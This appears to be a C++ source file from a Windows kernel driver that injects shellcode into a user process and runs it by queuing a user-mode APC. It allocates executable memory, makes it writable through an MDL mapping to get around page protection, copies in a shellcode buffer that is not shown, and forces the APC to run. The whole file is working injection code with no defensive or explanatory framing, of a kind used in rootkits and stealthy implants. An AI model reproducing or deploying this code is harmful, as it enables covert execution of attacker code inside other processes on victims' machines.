#pragma warning( disable : 6386 6273 )
#include "ApcHandler.h"

void ApcHandler::kernelFreeKapc(PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*)
{
	ExFreePoolWithTag(apc, DRIVER_TAG);

	::ExReleaseRundownProtection(&g_rundown_protection);
}

void ApcHandler::rundownFreeKapc(PKAPC apc)
{
	ExFreePoolWithTag(apc, DRIVER_TAG);

	::ExReleaseRundownProtection(&g_rundown_protection);
}

void ApcHandler::normalInjectCode(PVOID, PVOID, PVOID)
{

	void* address{ };
	size_t shellcode_size = sizeof(shellcodeHandler::injectedShellcode);

	auto status = ::ZwAllocateVirtualMemory(
		NtCurrentProcess(),
		&address,
		0,
		&shellcode_size,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READ
	);

	if (!NT_SUCCESS(status)) {
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not allocate memory in new process.\n"));

		return;
	}

	auto mdl = ::IoAllocateMdl(
		address,
		sizeof(shellcodeHandler::injectedShellcode),
		false,
		false,
		nullptr
	);

	if (!mdl) {
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not allocate a MDL.\n"));

		return;
	}

	::MmProbeAndLockPages(
		mdl,
		KernelMode,
		IoReadAccess
	);

	auto mapped_address = ::MmMapLockedPagesSpecifyCache(
		mdl,
		KernelMode,
		MmNonCached,
		nullptr,
		false,
		NormalPagePriority
	);

	if (!mapped_address) {
		::MmUnlockPages(mdl);
		::IoFreeMdl(mdl);
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not get a system address for the MDL.\n"));

		return;
	}

	status = ::MmProtectMdlSystemAddress(
		mdl,
		PAGE_READWRITE
	);

	if (!NT_SUCCESS(status)) {
		::MmUnmapLockedPages(mapped_address, mdl);
		::MmUnlockPages(mdl);
		::IoFreeMdl(mdl);
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not protect MDL address.\n"));

		return;
	}

	RtlCopyMemory(mapped_address, shellcodeHandler::injectedShellcode, sizeof(shellcodeHandler::injectedShellcode));

	::MmUnmapLockedPages(mapped_address, mdl);
	::MmUnlockPages(mdl);
	::IoFreeMdl(mdl);

	PKAPC apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);

	if (!apc) {
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not queue a user APC due to insufficient memory.\n"));

		return;
	}

	ApcHandler::KeInitializeApc(
		apc,
		::KeGetCurrentThread(),
		OriginalApcEnvironment,
		&ApcHandler::kernelFreeKapc,
		&ApcHandler::rundownFreeKapc,
		reinterpret_cast<PKNORMAL_ROUTINE>(address),
		UserMode,
		nullptr
	);

	auto inserted = ApcHandler::KeInsertQueueApc(
		apc,
		nullptr,
		nullptr,
		0
	);

	KeTestAlertThread(UserMode);

	if (!inserted) {
		ExFreePoolWithTag(apc, DRIVER_TAG);
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not insert a user APC.\n"));

		return;
	}

	KdPrint(("[+] Injected code and queued an APC successfully (pid=%d).\n", ::PsGetCurrentProcessId()));

	::ExReleaseRundownProtection(&g_rundown_protection);
}